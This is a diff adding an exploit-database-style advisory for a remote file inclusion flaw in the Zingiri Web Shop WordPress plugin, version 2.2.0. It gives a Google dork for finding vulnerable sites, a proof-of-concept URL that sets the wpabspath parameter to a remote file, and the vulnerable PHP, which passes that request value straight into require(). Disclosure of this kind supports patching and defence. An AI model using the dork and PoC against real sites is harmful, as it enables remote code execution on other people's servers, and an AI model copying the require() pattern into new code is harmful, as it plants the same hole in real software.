@@ -1,0 +1,34 @@
+# Exploit Title: Zingiri Web Shop Wordpress plugin RFI
+# Google Dork: inurl:wp-content/plugins/zingiri-web-shop
+# Date: 09/19/2011
+# Author: Ben Schmidt (supernothing (AT) spareclockcycles.org @_supernothing)
+# Software Link: http://wordpress.org/extend/plugins/zingiri-web-shop/download/
+# Version: 2.2.0 (tested)
+
+---
+PoC
+---
+http://SERVER/WP_PATH/wp-content/plugins/zingiri-web-shop/fws/ajax/init.inc.php?wpabspath=RFI OR /fwkfor/ajax/init.inc.php?wpabspath=RFI
+
+---
+Vulnerable Code
+---
+if ($_REQUEST['cms']=='jl') {
+	define('ZING_CMS','jl');
+	$_REQUEST['tmpl'] = 'component';
+	$_REQUEST['option'] = 'com_zingiriwebshop';
+	ob_start();
+	require($_REQUEST['wpabspath'].'/index.php');
+	ob_end_clean();
+} elseif ($_REQUEST['cms']=='dp') {
+	//all bootstrapping is already done
+} else {
+	if (!defined('ZING_AJAX') || !ZING_AJAX) {
+		/** Loads the WordPress Environment */
+		//require($_REQUEST['wpabspath'].'wp-blog-header.php');
+		require($_REQUEST['wpabspath'].'wp-load.php');
+		/** Load Zingiri Web Shop */
+		require(dirname(__FILE__).'/../../zing.readcookie.inc.php');
+		require(dirname(__FILE__).'/../../startmodules.inc.php');
+	}
+}
